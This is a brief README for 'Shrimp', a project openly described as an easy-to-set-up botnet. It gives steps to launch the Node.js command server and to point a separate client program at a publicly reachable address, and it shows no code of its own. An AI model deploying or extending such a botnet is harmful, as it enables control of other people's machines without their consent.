## Shrimp
Fast, minimalistic, and easy to set up botnet.

Simply clone this repo onto a linux server with node.js installed, do `npm install`, and do `node .`. 

Then, clone the [Client Code Repository](https://github.com/p0syd0n/shrimp_client) code and change constant `SERVER` in `main.py`. Make sure to make it is an ip/hostname that is acessible outside your LAN!
